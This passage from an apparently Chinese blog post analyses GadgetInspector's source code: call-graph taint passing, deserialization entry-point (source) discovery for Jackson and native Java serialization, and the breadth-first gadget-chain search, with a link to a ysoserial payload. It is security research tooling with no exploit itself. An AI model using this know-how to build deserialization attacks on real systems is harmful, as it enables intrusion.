class="keyword">break</span>;</span><br></pre></td></tr></table></figure><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210319103128715.png" alt="image-20210319103128715" style="zoom:80%;"><ul><li>getfield之后，就是调用method1方法，对应的JVM指令是invokevirtual，所以ASM调用visitMethodInsn，因为Main.main调用了A.method1，在这里个环境，清楚的用代码解释了为什么前面需要把参数命名为arg0、arg1、arg0.name这样，因为需要通过这样的一个字符串名称，和被调用方法的入参进行关联，并最终形成调用者和被调用者直接的参数关联。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitMethodInsn</span><span class="params">(<span class="keyword">int</span> opcode, String owner, String name, String desc, <span class="keyword">boolean</span> itf)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//获取被调用method的参数和类型，非静态方法需要把实例类型放在第一个元素</span></span><br><span class="line">    Type[] argTypes = Type.getArgumentTypes(desc);</span><br><span class="line">    <span class="keyword">if</span> (opcode != Opcodes.INVOKESTATIC) &#123;</span><br><span class="line">        Type[] extendedArgTypes = <span class="keyword">new</span> Type[argTypes.length+<span class="number">1</span>];</span><br><span class="line">        System.arraycopy(argTypes, <span class="number">0</span>, extendedArgTypes, <span class="number">1</span>, argTypes.length);</span><br><span class="line">        extendedArgTypes[<span class="number">0</span>] = Type.getObjectType(owner);</span><br><span class="line">        argTypes = extendedArgTypes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKESTATIC:</span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKEVIRTUAL:</span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKESPECIAL:</span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKEINTERFACE:</span><br><span class="line">            <span class="keyword">int</span> stackIndex = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; argTypes.length; i++) &#123;</span><br><span class="line">                <span class="comment">//最右边的参数，就是最后入栈，即在栈顶</span></span><br><span class="line">                <span class="keyword">int</span> argIndex = argTypes.length-<span class="number">1</span>-i;</span><br><span class="line">                Type type = argTypes[argIndex];</span><br><span class="line">                <span class="comment">//操作数栈出栈，调用方法前，参数都已入栈</span></span><br><span class="line">                Set&lt;String&gt; taint = getStackTaint(stackIndex);</span><br><span class="line">                <span class="keyword">if</span> (taint.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (String argSrc : taint) &#123;</span><br><span class="line">                        <span class="comment">//取出出栈的参数，判断是否为当前方法的入参，arg前缀</span></span><br><span class="line">                        <span class="keyword">if</span> (!argSrc.substring(<span class="number">0</span>, <span class="number">3</span>).equals(<span class="string">"arg"</span>)) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid taint arg: "</span> + argSrc);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">int</span> dotIndex = argSrc.indexOf(<span class="string">'.'</span>);</span><br><span class="line">                        <span class="keyword">int</span> srcArgIndex;</span><br><span class="line">                        String srcArgPath;</span><br><span class="line">                        <span class="keyword">if</span> (dotIndex == -<span class="number">1</span>) &#123;</span><br><span class="line">                            srcArgIndex = Integer.parseInt(argSrc.substring(<span class="number">3</span>));</span><br><span class="line">                            srcArgPath = <span class="keyword">null</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            srcArgIndex = Integer.parseInt(argSrc.substring(<span class="number">3</span>, dotIndex));</span><br><span class="line">                            srcArgPath = argSrc.substring(dotIndex+<span class="number">1</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">//记录参数流动关系</span></span><br><span class="line">                        <span class="comment">//argIndex：当前方法参数索引，srcArgIndex：对应上一级方法的参数索引</span></span><br><span class="line">                        discoveredCalls.add(<span class="keyword">new</span> GraphCall(</span><br><span class="line">                                <span class="keyword">new</span> MethodReference.Handle(<span class="keyword">new</span> ClassReference.Handle(<span class="keyword">this</span>.owner), <span class="keyword">this</span>.name, <span class="keyword">this</span>.desc),</span><br><span class="line">                                <span class="keyword">new</span> MethodReference.Handle(<span class="keyword">new</span> ClassReference.Handle(owner), name, desc),</span><br><span class="line">                                srcArgIndex,</span><br><span class="line">                                srcArgPath,</span><br><span class="line">                                argIndex));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                stackIndex += type.getSize();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Unsupported opcode: "</span> + opcode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">super</span>.visitMethodInsn(opcode, owner, name, desc, itf);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到此，gadgetinspector.CallGraphDiscovery#discover方法就结束了，然后执行gadgetinspector.CallGraphDiscovery#save对调用者-被调用者参数关系数据进行保存到callgraph.dat文件，其中数据的序列化输出格式，由GraphCall.Factory实现:</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201201114033068.png" alt="image-20201201114033068"></p><p>数据格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">调用者类名 调用者方法caller 调用者方法描述 被调用者类名 被调用者方法target 被调用者方法描述 调用者方法参数索引 调用者字段名 被调用者方法参数索引</span><br><span class="line">Main (Ljava/lang/String;)<span class="function">V main A <span class="title">method1</span> <span class="params">(Ljava/lang/String;)</span>Ljava/lang/String</span>; <span class="number">1</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="利用链入口搜索-SourceDiscovery"><a href="#利用链入口搜索-SourceDiscovery" class="headerlink" title="利用链入口搜索 SourceDiscovery"></a>利用链入口搜索 SourceDiscovery</h2><p>在这一个阶段中，会扫描所有的class，把符合，也就是可被反序列化并且可以在反序列化执行的方法，全部查找出来，因为没有这样的入口，就算存在执行链，也没办法通过反序列化的时候进行触发。</p><p>因为入口的触发，不同的反序列化方式会存在不同是实现，因此，在gadgetinspector中，存在着多个SourceDiscovery的实现，有jackson的，java原生序列化的等等，这里主要以jackson的SourceDiscovery实现开始分析。</p><p>这一步会根据已知的反序列化漏洞的入口，检查所有可以被触发的方法。例如，在利用链中使用代理时，任何可序列化并且是<code>java/lang/reflect/InvocationHandler</code>子类的invoke方法都可以视为source。这里还会根据具体的反序列化库决定类是否能被序列化。</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201202104444974.png" alt="image-20201202104444974"></p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201202110221901.png" alt="image-20201202110221901"></p><p>这里就是首先去查看想要找哪一种类型的反序列化漏洞入口点，</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201202110252070.png" alt="image-20201202110252070"></p><p>跟进config.getSourceDiscovery看一眼：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201202110107440.png" alt="image-20201202110107440"></p><p>先看SourceDiscovery抽象类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">SourceDiscovery</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;Source&gt; discoveredSources = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">addDiscoveredSource</span><span class="params">(Source source)</span> </span>&#123;</span><br><span class="line">        discoveredSources.add(source);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();</span><br><span class="line">        Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">        InheritanceMap inheritanceMap = InheritanceMap.load();</span><br><span class="line"></span><br><span class="line">        discover(classMap, methodMap, inheritanceMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                         Map&lt;MethodReference.Handle, MethodReference&gt; methodMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                         InheritanceMap inheritanceMap)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        DataLoader.saveData(Paths.get(<span class="string">"sources.dat"</span>), <span class="keyword">new</span> Source.Factory(), discoveredSources);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到它的discover实现中，加载了所有的类、方法、继承实现关系数据，接着调用抽象方法discover，然后，我们跟进jackson的具体实现中：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201202104037072.png" alt="image-20201202104037072"></p><p>从上述代码可以看出，实现非常之简单，只是判断了方法：</p><ol><li>是否无参构造方法</li><li>是否getter方法</li><li>是否setter方法</li></ol><p>为什么对于source会做这样的判断？因为对于jackson的反序列化，在其反序列化时，必须通过无参构造方法反序列化（没有则会反序列化失败），并且会根据一定情况调用其反序列化对象的getter、setter方法。</p><p>这里SourceDiscovery是一个抽象类，具体情况具体继承分析，看一下它的的一个简单继承SimpleSourceDiscovery：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleSourceDiscovery</span> <span class="keyword">extends</span> <span class="title">SourceDiscovery</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                         Map&lt;MethodReference.Handle, MethodReference&gt; methodMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                         InheritanceMap inheritanceMap, Map&lt;MethodReference.Handle, Set&lt;GraphCall&gt;&gt; graphCallMap)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> SerializableDecider serializableDecider = <span class="keyword">new</span> SimpleSerializableDecider(inheritanceMap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">"finalize"</span>) &amp;&amp; method.getDesc().equals(<span class="string">"()V"</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If a class implements readObject, the ObjectInputStream passed in is considered tainted</span></span><br><span class="line">        <span class="comment">// 如果类实现了readObject，则传入的ObjectInputStream被认为是污染的</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">"readObject"</span>) &amp;&amp; method.getDesc().equals(<span class="string">"(Ljava/io/ObjectInputStream;)V"</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Using the proxy trick, anything extending serializable and invocation handler is tainted.</span></span><br><span class="line">        <span class="comment">// 使用动态代理trick时，任何扩展了serializable and InvocationHandler的类会受到污染。</span></span><br><span class="line">        <span class="keyword">for</span> (ClassReference.Handle clazz : classMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(clazz))</span><br><span class="line">                    &amp;&amp; inheritanceMap.isSubclassOf(clazz, <span class="keyword">new</span> ClassReference.Handle(<span class="string">"java/lang/reflect/InvocationHandler"</span>))) &#123;</span><br><span class="line">                MethodReference.Handle method = <span class="keyword">new</span> MethodReference.Handle(</span><br><span class="line">                        clazz, <span class="string">"invoke"</span>, <span class="string">"(Ljava/lang/Object;Ljava/lang/reflect/Method;[Ljava/lang/Object;)Ljava/lang/Object;"</span>);</span><br><span class="line"></span><br><span class="line">                addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// hashCode() or equals() are accessible entry points using standard tricks of putting those objects into a HashMap.</span></span><br><span class="line">        <span class="comment">// hashCode（）或equals（）是将对象放入HashMap的标准技巧的可访问入口点</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">"hashCode"</span>) &amp;&amp; method.getDesc().equals(<span class="string">"()I"</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">"equals"</span>) &amp;&amp; method.getDesc().equals(<span class="string">"(Ljava/lang/Object;)Z"</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Using a comparator proxy, we can jump into the call() / doCall() method of any groovy Closure and all the</span></span><br><span class="line">        <span class="comment">// args are tainted.</span></span><br><span class="line">        <span class="comment">// 使用比较器代理，可以跳转到任何groovy Closure的call()/doCall()方法，所有的args都被污染</span></span><br><span class="line">        <span class="comment">// https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Groovy1.java</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))</span><br><span class="line">                    &amp;&amp; inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> ClassReference.Handle(<span class="string">"groovy/lang/Closure"</span>))</span><br><span class="line">                    &amp;&amp; (method.getName().equals(<span class="string">"call"</span>) || method.getName().equals(<span class="string">"doCall"</span>))) &#123;</span><br><span class="line"></span><br><span class="line">                addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                Type[] methodArgs = Type.getArgumentTypes(method.getDesc());</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methodArgs.length; i++) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, i + <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在扫描所有的方法后，具备条件的method都会被添加到gadgetinspector.SourceDiscovery#discoveredSources中，并最后通过gadgetinspector.SourceDiscovery#save保存</p><p>最终输出到sources.dat文件的数据形式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类名 方法名 方法描述 污染参数索引</span><br></pre></td></tr></table></figure><h2 id="gadgets挖掘阶段-GadgetChainDiscovery"><a href="#gadgets挖掘阶段-GadgetChainDiscovery" class="headerlink" title="gadgets挖掘阶段-GadgetChainDiscovery"></a>gadgets挖掘阶段-GadgetChainDiscovery</h2><p>这一步会遍历全部的source，并在callgraph.dat中递归查找所有可以继续传递污点参数的子方法调用，直至遇到sink中的方法。</p><p>分析gadgetinspector.GadgetChainDiscovery#discover代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">        InheritanceMap inheritanceMap = InheritanceMap.load();</span><br><span class="line">        Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap = InheritanceDeriver.getAllMethodImplementations(</span><br><span class="line">                inheritanceMap, methodMap);<span class="comment">//得到方法的所有子类方法实现（被子类重写的方法）</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> ImplementationFinder implementationFinder = config.getImplementationFinder(</span><br><span class="line">                methodMap, methodImplMap, inheritanceMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将方法的所有子类方法实现保存到methodimpl.dat</span></span><br><span class="line">        <span class="keyword">try</span> (Writer writer = Files.newBufferedWriter(Paths.get(<span class="string">"methodimpl.dat"</span>))) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodImplMap.entrySet()) &#123;</span><br><span class="line">                writer.write(entry.getKey().getClassReference().getName());</span><br><span class="line">                writer.write(<span class="string">"\t"</span>);</span><br><span class="line">                writer.write(entry.getKey().getName());</span><br><span class="line">                writer.write(<span class="string">"\t"</span>);</span><br><span class="line">                writer.write(entry.getKey().getDesc());</span><br><span class="line">                writer.write(<span class="string">"\n"</span>);</span><br><span class="line">                <span class="keyword">for</span> (MethodReference.Handle method : entry.getValue()) &#123;</span><br><span class="line">                    writer.write(<span class="string">"\t"</span>);</span><br><span class="line">                    writer.write(method.getClassReference().getName());</span><br><span class="line">                    writer.write(<span class="string">"\t"</span>);</span><br><span class="line">                    writer.write(method.getName());</span><br><span class="line">                    writer.write(<span class="string">"\t"</span>);</span><br><span class="line">                    writer.write(method.getDesc());</span><br><span class="line">                    writer.write(<span class="string">"\n"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方法调用map，key为父方法，value为子方法与父方法参数传递关系</span></span><br><span class="line">        Map&lt;MethodReference.Handle, Set&lt;GraphCall&gt;&gt; graphCallMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (GraphCall graphCall : DataLoader.loadData(Paths.get(<span class="string">"callgraph.dat"</span>), <span class="keyword">new</span> GraphCall.Factory())) &#123;</span><br><span class="line">            MethodReference.Handle caller = graphCall.getCallerMethod();</span><br><span class="line">            <span class="keyword">if</span> (!graphCallMap.containsKey(caller)) &#123;</span><br><span class="line">                Set&lt;GraphCall&gt; graphCalls = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">                graphCalls.add(graphCall);</span><br><span class="line">                graphCallMap.put(caller, graphCalls);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                graphCallMap.get(caller).add(graphCall);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//exploredMethods保存在调用链从查找过程中已经访问过的方法节点，methodsToExplore保存调用链</span></span><br><span class="line">        Set&lt;GadgetChainLink&gt; exploredMethods = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        LinkedList&lt;GadgetChain&gt; methodsToExplore = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        <span class="comment">//加载所有sources，并将每个source作为每条链的第一个节点</span></span><br><span class="line">        <span class="keyword">for</span> (Source source : DataLoader.loadData(Paths.get(<span class="string">"sources.dat"</span>), <span class="keyword">new</span> Source.Factory())) &#123;</span><br><span class="line">            GadgetChainLink srcLink = <span class="keyword">new</span> GadgetChainLink(source.getSourceMethod(), source.getTaintedArgIndex());</span><br><span class="line">            <span class="keyword">if</span> (exploredMethods.contains(srcLink)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            methodsToExplore.add(<span class="keyword">new</span> GadgetChain(Arrays.asList(srcLink)));</span><br><span class="line">            exploredMethods.add(srcLink);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> iteration = <span class="number">0</span>;</span><br><span class="line">        Set&lt;GadgetChain&gt; discoveredGadgets = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="comment">//使用广度优先搜索所有从source到sink的调用链</span></span><br><span class="line">        <span class="keyword">while</span> (methodsToExplore.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((iteration % <span class="number">1000</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                LOGGER.info(<span class="string">"Iteration "</span> + iteration + <span class="string">", Search space: "</span> + methodsToExplore.size());</span><br><span class="line">            &#125;</span><br><span class="line">            iteration += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            GadgetChain chain = methodsToExplore.pop();<span class="comment">//从队首弹出一条链</span></span><br><span class="line">            GadgetChainLink lastLink = chain.links.get(chain.links.size()-<span class="number">1</span>);<span class="comment">//取这条链最后一个节点</span></span><br><span class="line"></span><br><span class="line">            Set&lt;GraphCall&gt; methodCalls = graphCallMap.get(lastLink.method);<span class="comment">//获取当前节点方法所有子方法与当前节点方法参数传递关系</span></span><br><span class="line">            <span class="keyword">if</span> (methodCalls != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (GraphCall graphCall : methodCalls) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (graphCall.getCallerArgIndex() != lastLink.taintedArgIndex) &#123;</span><br><span class="line">                        <span class="comment">//如果当前节点方法的污染参数与当前子方法受父方法参数影响的Index不一致则跳过</span></span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    Set&lt;MethodReference.Handle&gt; allImpls = implementationFinder.getImplementations(graphCall.getTargetMethod());<span class="comment">//获取子方法所在类的所有子类重写方法</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span> (MethodReference.Handle methodImpl : allImpls) &#123;</span><br><span class="line">                        GadgetChainLink newLink = <span class="keyword">new</span> GadgetChainLink(methodImpl, graphCall.getTargetArgIndex());<span 